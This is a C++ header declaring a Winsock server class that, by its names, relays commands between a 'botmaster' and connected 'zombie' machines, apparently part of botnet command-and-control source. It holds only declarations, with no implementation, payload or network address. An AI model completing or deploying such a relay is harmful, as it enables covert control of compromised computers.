#pragma once

#include <WS2tcpip.h>
#pragma comment (lib, "ws2_32.lib")

#include <iostream>
#include <string>
#include <vector>

#define WEIRDO	  0
#define BOTMASTER 1
#define ZOMBIE	  2

#define BOTMASTERDISCONNECT 3
#define BOTMDISCONNECT 4

class Server
{
public:
	Server(std::string ip, int port);
	~Server();

	bool init();
	int cleanUp();

	void waiting();

	bool createListeningSocket();
	int acceptConnection();

	void sendToZombies(const std::string& msg);
	bool sendToZombie(SOCKET zombie, const std::string& msg);
	bool sendToBotmaster(const std::string& msg);

	bool receive();
	std::string getBotMasterMessage();
	std::vector<std::string> getBotMessages();

private:
	std::string m_IpAddress;
	int m_Port;

	SOCKET m_Listening = INVALID_SOCKET;
	SOCKET m_Botmaster = INVALID_SOCKET;

	std::vector<SOCKET> m_Zombies;

	//rcv states
	std::string m_BotMasterBuf;

	std::vector<std::pair<SOCKET, std::string>> m_BotBufs;

	//set of socket descriptors for select() 
	fd_set m_Readfds;
	SOCKET m_RdySocket;
};